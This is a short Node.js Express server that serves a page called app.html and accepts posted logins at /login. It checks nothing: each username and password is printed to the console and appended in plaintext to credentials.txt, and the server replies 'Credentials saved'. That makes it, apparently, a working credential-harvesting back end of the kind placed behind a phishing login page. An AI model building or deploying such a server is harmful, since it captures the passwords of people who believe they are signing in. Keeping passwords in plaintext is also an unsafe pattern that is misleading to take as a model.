const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ---- Path logic ----
const WINDOWS_PATH = 'C:\\Users\\donut\\Desktop\\data';
let SAVE_DIR;
if (fs.existsSync(WINDOWS_PATH)) {
  SAVE_DIR = WINDOWS_PATH;
} else {
  SAVE_DIR = path.join(__dirname, 'data');
}
const SAVE_FILE = path.join(SAVE_DIR, 'credentials.txt');

// Ensure directory exists
if (!fs.existsSync(SAVE_DIR)) {
  fs.mkdirSync(SAVE_DIR, { recursive: true });
  console.log(`Created directory: ${SAVE_DIR}`);
}
console.log(`Saving to: ${SAVE_FILE}`);

app.use(express.json());
app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile('app.html', { root: __dirname });
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  console.log(`Received login: ${username} / ${password}`);

  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password required' });
  }

  const timestamp = new Date().toISOString();
  const logLine = `[${timestamp}] Username: ${username} | Password: ${password}\n`;

  try {
    // Write with a flag to create if missing
    fs.appendFileSync(SAVE_FILE, logLine, 'utf8');
    console.log(`Appended to ${SAVE_FILE}`);
    res.json({ success: true, message: 'Credentials saved' });
  } catch (err) {
    console.error('Error writing to file:', err);
    res.status(500).json({ error: 'Failed to save credentials' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
